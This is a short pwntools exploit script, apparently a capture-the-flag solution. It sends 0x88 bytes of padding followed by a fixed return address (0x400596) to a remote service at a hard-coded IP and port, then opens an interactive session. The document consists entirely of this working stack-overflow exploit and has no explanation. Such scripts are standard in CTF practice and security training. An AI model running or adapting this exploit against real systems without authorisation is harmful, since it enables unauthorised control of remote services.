from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",35610)
retaddr=0x0000000000400596

payload='a'*0x88+p64(retaddr)
io.sendline(payload)

io.interactive()
